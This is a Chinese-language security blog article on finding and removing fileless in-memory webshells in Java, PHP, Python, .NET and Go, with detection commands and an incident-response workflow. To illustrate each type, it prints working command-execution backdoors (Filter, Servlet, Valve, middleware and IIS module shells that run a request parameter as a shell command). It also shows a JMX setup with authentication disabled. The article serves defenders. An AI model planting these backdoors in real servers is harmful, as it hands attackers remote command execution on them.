---

title: 内存马查杀技巧详解
tags: \[Web 安全, 内存马, Webshell 检测, 应急响应, 安全防御]
date: 2024-07-02

---

# 内存马查杀技巧详解

内存马是一种无文件攻击技术，恶意代码驻留在服务器内存中，不写入磁盘，传统杀软和文件扫描工具难以发现。攻击者通过植入内存马来维持对服务器的长期控制。本文系统梳理各语言平台内存马的原理、检测思路及查杀方法。

## 1. 内存马概述

### 1.1 什么是内存马

内存马（Memory WebShell）是一种将恶意代码直接注入到 Web 应用进程内存中的后门技术。与传统 WebShell 不同，内存马**没有磁盘文件**，它利用中间件或语言的扩展机制（Filter、Listener、Controller、动态注册路由等）在内存中注册恶意逻辑。

### 1.2 内存马 vs 传统 WebShell

| 特性     | 传统 WebShell               | 内存马                     |
| -------- | --------------------------- | -------------------------- |
| 存在形式 | 磁盘文件（.php/.jsp/.aspx） | 内存中                     |
| 检测难度 | 可通过文件扫描发现          | 文件扫描无效               |
| 访问方式 | 直接访问文件 URL            | 任意 URL（劫持请求处理链） |
| 持久性   | 持久（文件不删就一直存在）  | 进程重启后消失             |
| 免杀能力 | 需要做免杀处理              | 天然的免杀优势             |
| 日志痕迹 | 访问日志可见                | 无明显特征 URL             |

### 1.3 常见内存马类型

| 平台       | 内存马类型                                                                                       |
| ---------- | ------------------------------------------------------------------------------------------------ |
| **Java**   | Filter 型、Servlet 型、Listener 型、Valve 型(Tomcat)、Agent 型、Spring Controller/Interceptor 型 |
| **PHP**    | OPcache 马、Swoole 扩展马、thinkphp 中间件马                                                     |
| **Python** | Flask/Django 中间件马、装饰器马                                                                  |
| **.NET**   | HTTP Module 马、IIS Module 马                                                                    |
| **Go**     | 中间件马（Gin/Echo 等框架）                                                                      |

---

## 2. Java 内存马

Java 是内存马的重灾区，主要利用 Servlet 容器的动态注册机制。

### 2.1 Filter 型内存马

最经典的 Java 内存马，利用`ServletContext`动态注册 Filter。

#### 注入原理

```java
// 获取ServletContext
ServletContext ctx = request.getServletContext();

// 获取FilterRegistration动态注册能力
FilterRegistration.Dynamic filter = ctx.addFilter("evilFilter", new Filter() {
    @Override
    public void init(FilterConfig filterConfig) {}

    @Override
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest hreq = (HttpServletRequest) req;
        String cmd = hreq.getParameter("cmd");
        if (cmd != null) {
            Runtime.getRuntime().exec(cmd);
        }
        chain.doFilter(req, resp);
    }

    @Override
    public void destroy() {}
});

// 注册到所有URL
filter.addMappingForUrlPatterns(
    EnumSet.of(DispatcherType.REQUEST),
    false,
    "/*"
);
```

#### 冰蝎/哥斯拉 Filter 马特征

冰蝎和哥斯拉内存马有固定的注册模式。哥斯拉内存马常用的初始化方式：

```java
// 哥斯拉Filter内存马的典型结构
// 通过反射获取StandardContext
// 调用addFilterDef/addFilterMap注册恶意Filter
Object standardContext = getStandardContext(servletContext);
Field filterConfigs = standardContext.getClass().getDeclaredField("filterConfigs");
// ...
```

### 2.2 Servlet 型内存马

动态注册一个 Servlet 来处理恶意请求。

```java
ServletRegistration.Dynamic servlet = ctx.addServlet("evilServlet", new HttpServlet() {
    @Override
    protected void service(HttpServletRequest req, HttpServletResponse resp) {
        String cmd = req.getParameter("pass");
        if (cmd != null) {
            try {
                Process p = Runtime.getRuntime().exec(cmd);
                // 回显
                InputStream in = p.getInputStream();
                byte[] b = new byte[1024];
                int len;
                while ((len = in.read(b)) != -1) {
                    resp.getOutputStream().write(b, 0, len);
                }
            } catch (Exception e) {}
        }
    }
});
servlet.addMapping("/evil/*");
```

### 2.3 Listener 型内存马

利用 ServletRequestListener 或 HttpSessionListener 来触发恶意代码。

```java
ctx.addListener(new ServletRequestListener() {
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
        String cmd = req.getParameter("cmd");
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (Exception e) {}
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {}
});
```

### 2.4 Tomcat Valve 型内存马

Tomcat 特有的 Pipeline-Valve 机制，比 Filter 更底层：

```java
// 获取StandardHost或StandardContext的Pipeline
// 然后添加自定义Valve
Field pipelineField = StandardHost.class.getDeclaredField("pipeline");
StandardPipeline pipeline = (StandardPipeline) pipelineField.get(host);
pipeline.addValve(new ValveBase() {
    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            Runtime.getRuntime().exec(cmd);
        }
        getNext().invoke(request, response);
    }
});
```

### 2.5 Spring Controller/Interceptor 型内存马

在 Spring 框架中动态注册 Controller：

```java
// 利用WebApplicationContext动态注册Controller
RequestMappingHandlerMapping handlerMapping =
    ctx.getBean(RequestMappingHandlerMapping.class);

// 反射创建Controller
// 利用ClassLoader.defineClass或Unsafe加载恶意Controller字节码
Method registerMapping = RequestMappingHandlerMapping.class
    .getDeclaredMethod("registerMapping", Object.class, Object.class, Method.class);
registerMapping.setAccessible(true);
registerMapping.invoke(handlerMapping, evilController, handlerMapping, method);
```

### 2.6 Agent 型内存马

利用 Java Instrumentation API，通过 Attach 到目标 JVM 注入 Agent Jar。

```bash
# 命令行Attach示例
java -jar attach-loader.jar <target_pid> <agent_jar>
```

```java
// Agent premain方法
public class AgentMemShell {
    public static void agentmain(String agentArgs, Instrumentation inst) {
        // 利用inst.redefineClasses或retransformClasses
        // 修改目标类（如某个Filter或Servlet）的字节码
        // 注入恶意逻辑
    }
}
```

Agent 型内存马的优势：

- 不通过 Servlet API 注册

- 不产生新的 Filter/Listener/Servlet 注册记录

- 直接修改类字节码，极度隐蔽

### 2.7 Java 内存马检测方法

#### 方法一：检查 Filter/Listener/Servlet 注册列表

```java
// 遍历已注册的Filter
// 注意：通过MBean方式可能不完整
// 需要反射获取StandardContext的内部结构

// JSP检测脚本
<%
ServletContext ctx = request.getSession().getServletContext();
// 反射获取StandardContext
Field appCtxField = ctx.getClass().getDeclaredField("context");
appCtxField.setAccessible(true);
Object appCtx = appCtxField.get(ctx);
Field stdCtxField = appCtx.getClass().getDeclaredField("context");
stdCtxField.setAccessible(true);
Object stdCtx = stdCtxField.get(appCtx);

// 获取并遍历filterConfigs
Field filterConfigsField = stdCtx.getClass().getDeclaredField("filterConfigs");
filterConfigsField.setAccessible(true);
Map filterConfigs = (Map) filterConfigsField.get(stdCtx);
for (Object entry : filterConfigs.entrySet()) {
    // 打印Filter名称和类名
    out.println("Filter: " + entry);
}
%>
```

#### 方法二：检查 JMX MBean

通过 JMX 获取 Tomcat 运行时信息：

```bash
# JMX连接查看MBean
# 在catalina.sh中添加JMX参数后：
# -Dcom.sun.management.jmxremote.port=9999
# -Dcom.sun.management.jmxremote.ssl=false
# -Dcom.sun.management.jmxremote.authenticate=false

# 使用jconsole或jvisualvm连接
# 查看Catalina -> WebModule -> 对应的context路径 -> filter/valve列表
```

#### 方法三：JVM 内存 dump 分析

```bash
# 获取目标JVM进程PID
jps -l | grep tomcat

# dump堆内存
jmap -dump:format=b,file=/tmp/heap.hprof <PID>

# 使用MAT(Memory Analyzer Tool)或Eclipse Memory Analyzer分析
# 搜索已加载的Filter/Listener/Valve类
# 定位可疑的类（无对应jar包来源的匿名类）
```

#### 方法四：对比 Class 字节码

```bash
# dump目标类字节码
java -jar class-dumper.jar <PID> <全限定类名>

# 与干净的原始class进行反编译对比
javap -c -p DumpedClass.class > dumped.txt
javap -c -p OriginalClass.class > original.txt
diff dumped.txt original.txt
```

#### 方法五：Arthas 在线诊断

```bash
# 下载并启动Arthas
curl -O https://arthas.aliyun.com/arthas-boot.jar
java -jar arthas-boot.jar

# 列出所有Filter
ognl '@org.apache.catalina.core.StandardContext@...'

# 查看已加载的类（搜索可疑类名）
sc *evil*
sc *shell*

# 反编译可疑类
jad com.example.evilFilter

# 查看类加载器树
classloader -t
```

---

## 3. PHP 内存马

### 3.1 OPcache 内存马

PHP 5.5+引入 OPcache，编译后的 opcode 缓存在共享内存中。攻击者可以覆盖 OPcache 中的文件缓存，绕过文件扫描。

#### 原理

1.  上传一个"正常"的 PHP 文件

2.  PHP 将其编译并存入 OPcache

3.  修改 OPcache 中对应文件的二进制 opcode 数据

4.  后续请求执行被篡改的 opcode

#### 检测

```bash
# 检查OPcache状态脚本
<?php
$info = opcache_get_status();
print_r($info['scripts']);  // 查看所有缓存脚本
?>

# 对比文件和OPcache的时间戳
# 如果文件mtime与OPcache记录严重不一致，存在可疑
```

```bash
# 使用opcache_reset()清除所有缓存
# 内存马会被一起清除
php -r 'opcache_reset();'
```

### 3.2 Swoole 扩展内存马

Swoole 是常驻内存的 PHP 扩展，可以在运行时动态注册路由。

```php
// 动态注册路由实现内存马
$http->on('request', function ($request, $response) {
    if (isset($request->get['cmd'])) {
        $response->end(system($request->get['cmd']));
    }
});
```

#### 检测

Swoole 内存马随进程启动加载，重点排查进程的启动脚本和自动加载逻辑。

### 3.3 PHP-FPM 内存马

通过修改 PHP-FPM 进程内存，或利用`dl()`动态加载扩展（如果未被禁用）。

### 3.4 PHP 内存马检测

```bash
# 1. 检查PHP进程内存映射
cat /proc/<php-fpm-pid>/maps | grep -v "\.so" | grep -v "\.php"

# 2. 检查已加载的扩展
php -m | grep -v '^\['
# 对比已知干净的扩展列表

# 3. 排查OPcache状态
php -r 'var_dump(opcache_get_status());'

# 4. 重启PHP-FPM清空内存马
# 适用于普通Worker进程内的内存马
systemctl restart php-fpm
# 但不适用于OPcache马或Swoole马

# 5. 使用open_basedir和disable_functions限制
```

---

## 4. Python 内存马

### 4.1 Flask 中间件马

```python
# 通过Flask的before_request钩子注入
@app.before_request
def mem_shell():
    cmd = request.args.get('cmd')
    if cmd:
        return os.popen(cmd).read()
```

#### 检测

```python
# 获取Flask应用中的所有URL规则和钩子
from flask import current_app
print(current_app.url_map)        # URL路由
print(current_app.before_request_funcs)  # before_request钩子
print(current_app.after_request_funcs)   # after_request钩子
```

### 4.2 Django 中间件马

```python
# 动态添加Django中间件
class MemShellMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        cmd = request.GET.get('cmd')
        if cmd:
            import subprocess
            return subprocess.check_output(cmd, shell=True)
        return self.get_response(request)

# 动态添加到settings
settings.MIDDLEWARE.insert(0, 'path.to.MemShellMiddleware')
```

#### 检测

```python
# 查看已注册的中间件
from django.conf import settings
print(settings.MIDDLEWARE)

# 检查是否有未在代码库中定义的可疑中间件
```

### 4.3 WSGI 中间件马

```python
# 直接在WSGI层包装
def mem_shell_middleware(app):
    def wrapper(environ, start_response):
        from urllib.parse import parse_qs
        params = parse_qs(environ.get('QUERY_STRING', ''))
        if 'cmd' in params:
            import subprocess
            output = subprocess.check_output(params['cmd'][0], shell=True)
            start_response('200 OK', [('Content-Type', 'text/plain')])
            return [output]
        return app(environ, start_response)
    return wrapper
```

#### 检测

```bash
# 审查gunicorn/uwsgi配置
# 检查wsgi.py或app.py中的中间件包装链

# 检查进程环境
cat /proc/<pid>/environ | tr '\0' '\n'
```

---

## 5. .NET 内存马

### 5.1 IIS Module 马

```csharp
// 动态注册IHttpModule
public class MemShellModule : IHttpModule
{
    public void Init(HttpApplication context)
    {
        context.BeginRequest += (sender, e) =>
        {
            var cmd = HttpContext.Current.Request["cmd"];
            if (!string.IsNullOrEmpty(cmd))
            {
                var p = new System.Diagnostics.Process();
                p.StartInfo = new ProcessStartInfo("cmd.exe", "/c " + cmd)
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false
                };
                p.Start();
                HttpContext.Current.Response.Write(p.StandardOutput.ReadToEnd());
                HttpContext.Current.Response.End();
            }
        };
    }
    public void Dispose() {}
}
```

#### 检测

```powershell
# 检查已加载的HTTP Modules
appcmd list modules

# 检查.NET运行时程序集
[System.AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.IsDynamic } |
    Format-Table FullName

# 检查GAC和临时ASP.NET文件
dir C:\Windows\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files\
```

---

## 6. Go 内存马

### 6.1 Gin 中间件马

```go
// 动态添加Gin中间件
func MemShell() gin.HandlerFunc {
    return func(c *gin.Context) {
        cmd := c.Query("cmd")
        if cmd != "" {
            out, _ := exec.Command("bash", "-c", cmd).Output()
            c.String(200, string(out))
            c.Abort()
            return
        }
        c.Next()
    }
}
```

### 6.2 Go 内存马检测

Go 是编译型语言，运行时无法动态加载代码（除 plugin 包外）。检测重点是：

```bash
# 1. 审查源码中的路由注册和中间件
# 2. 检查使用了cgo/plugin的动态加载代码
# 3. 排查外部注入（如ptrace注入）
cat /proc/<pid>/maps
# 4. 检查进程的网络连接
ss -tlnp | grep <go_app_pid>
```

---

## 7. 通用检测方法汇总

### 7.1 进程层面

```bash
# 检查Web进程的网络连接
netstat -antp | grep <web_process_pid>
lsof -p <pid> -i -P -n

# 检查进程打开的文件
lsof -p <pid> | grep -E '\.so$|\.jar$|\.dll$'

# 检查进程的内存映射
cat /proc/<pid>/maps
# 关注匿名可执行内存区域 (rwxp)
# 关注动态加载的异常.so/.jar文件

# 检查进程树（是否有异常子进程）
pstree -p <pid>
ps auxf | grep -A5 <web_process>
```

### 7.2 文件层面

```bash
# 搜索最近被修改的可疑文件
find /var/www/html -type f -mtime -1 -ls

# 搜索Web目录下的异常文件类型
find /var/www/html -name "*.jar" -o -name "*.class" -o -name "*.so"

# 检查crontab
crontab -l; cat /var/spool/cron/*; cat /etc/crontab

# 检查启动项
systemctl list-units --type=service | grep -v "^●"
cat /etc/rc.local
```

### 7.3 流量层面

```bash
# 分析Web访问日志
# 1. 查找异常User-Agent
cat access.log | grep -v "Mozilla" | grep -v "curl" | head -20

# 2. 查找带命令参数的请求
cat access.log | grep -iE 'cmd=|exec=|passthru=|ping |whoami'

# 3. 查找高频请求同一URL的IP
cat access.log | awk '{print $1,$7}' | sort | uniq -c | sort -rn | head -20

# 4. 查找非工作时间段的异常请求
cat access.log | grep -E '^.*(0[0-5]|2[2-3]):'

# 5. 查找大POST请求体
cat access.log | awk '$10 > 10000 {print $0}'
```

### 7.4 内存分析

```bash
# Linux内存dump分析
gcore -o /tmp/web_dump <pid>  # gcore dump进程内存
strings /tmp/web_dump.* | grep -iE 'shell|eval|exec|cmd|pass'

# Java堆dump
jmap -dump:format=b,file=/tmp/java_heap.hprof <pid>
# 用Eclipse MAT分析：查可疑类、Object、字符串

# PHP进程内存
# gdb attach后 dump memory
gdb -p <php_pid>
(gdb) dump memory /tmp/php_mem.dump 0x<start> 0x<end>
(gdb) quit
strings /tmp/php_mem.dump | grep -E 'system|exec|passthru|eval|base64_decode'
```

---

## 8. 核心检测工具

### 8.1 开源检测工具

| 工具                      | 平台    | 用途                                          |
| ------------------------- | ------- | --------------------------------------------- |
| **Copagent**              | Java    | 基于 Java Agent 的 Filter/Listener 内存马检测 |
| **java-memshell-scanner** | Java    | 通过 Arthas/脚本检测 Tomcat 内存马            |
| **arthas**                | Java    | 在线诊断（jad/sc/ognl 命令）                  |
| **ClassFinal**            | Java    | 字节码加密和篡改检测                          |
| **rkhunter**              | Linux   | Rootkit 检测（可发现进程注入）                |
| **chkrootkit**            | Linux   | 同 Rootkit 检测                               |
| **AIDE**                  | Linux   | 文件完整性校验                                |
| **Tripwire**              | Linux   | 文件变更监控                                  |
| **Sysmon**                | Windows | 系统行为监控                                  |

### 8.2 D 盾/河马等 WebShell 扫描

传统扫描器对**内存马无效**，但可以配合使用：

- **D 盾**：扫描磁盘文件，排除传统 WebShell 威胁

- **河马 WebShell 查杀**：同磁盘扫描

- **百度 WebShell 检测**：AI 辅助文件检测

内存马检测核心思路：

> 磁盘上没有文件 → 传统扫描器扫不到 → 必须通过**内存分析/运行时检测/MBean/Arthas**来发现

---

## 9. 内存马应急响应流程

发现疑似被植入内存马的应急响应步骤：

    1. 隔离
       - 保留现场、不重启服务（重启会丢失内存证据）
       - 封禁可疑IP
       - 切换到维护页面

    2. 取证
       - 保存Web访问日志
       - dump JVM堆内存 / gcore进程内存
       - 保存Filter/Listener/Servlet/Valve配置快照
       - 导出JMX MBean信息
       - 记录当前网络连接状态

    3. 分析
       - 对比正常的Filter/Middleware列表
       - 分析代码逻辑，找到内存马入口点
       - 从access.log回溯攻击时间线
       - 分析漏洞利用方式（反序列化？文件上传？RCE？）

    4. 清除
       - Java: 注销可疑的Filter/Servlet/Listener/Valve
       - 或重启服务（清空所有内存数据）
       - 修复漏洞入口
       - 更改所有密码和密钥

    5. 恢复
       - 从干净备份恢复
       - 更新组件版本
       - 加强WAF规则
       - 增加内存马专项监控

---

## 10. 预防措施

### 10.1 技术层面

```bash
# 1. 限制动态注册能力
# Tomcat: 限制应用调用的Servlet API
# 配置SecurityManager

# 2. 使用RASP（Runtime Application Self-Protection）
# 如OpenRASP、百度的RASP可在运行时检测内存马注册行为

# 3. 限制JMX访问
# Tomcat: 不对外开放JMX端口，或配置认证

# 4. 运行时完整性监控
# 定期对比Filter/Listener/Valve列表与基线
# 告警新增的注册项
```

### 10.2 管理层面

    - 定期安全审计Web应用配置
    - 最小权限原则运行中间件
    - 及时更新中间件和框架版本（修复RCE漏洞，减少植入入口）
    - 对运维人员操作做审计
    - 建立内存马应急响应预案

---

> **核心观点**：内存马查杀是一场不对称的战斗——攻击者只写一次内存，防守方要监控所有内存。与其追求 100%检测，不如做好**漏洞修复**，减少攻击者植入内存马的入口。
